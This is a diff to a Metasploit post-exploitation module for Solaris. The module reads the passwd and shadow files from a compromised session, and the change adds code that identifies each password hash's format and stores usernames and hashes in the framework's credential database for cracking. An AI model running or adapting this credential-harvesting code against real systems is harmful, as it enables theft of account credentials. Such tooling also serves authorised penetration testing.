@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'metasploit/framework/hashes/identify'
+
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Solaris::Priv
@@ -34,6 +36,22 @@ class MetasploitModule < Msf::Post
       # Unshadow the files
       john_file = unshadow(passwd_file, shadow_file)
       john_file.each_line do |l|
+        hash_parts = l.split(':')
+        jtr_format = identify_hash hash_parts[1]
+        if jtr_format.empty? #overide the default
+          jtr_format = 'des,bsdi,crypt'
+        end
+        credential_data = {
+            jtr_format: jtr_format,
+            origin_type: :session,
+            post_reference_name: self.refname,
+            private_type: :nonreplayable_hash,
+            private_data: hash_parts[1],
+            session_id: session_db_id,
+            username: hash_parts[0],
+            workspace_id: myworkspace_id
+        }
+        create_credential(credential_data)
         print_good(l.chomp)
       end
       # Save pwd file
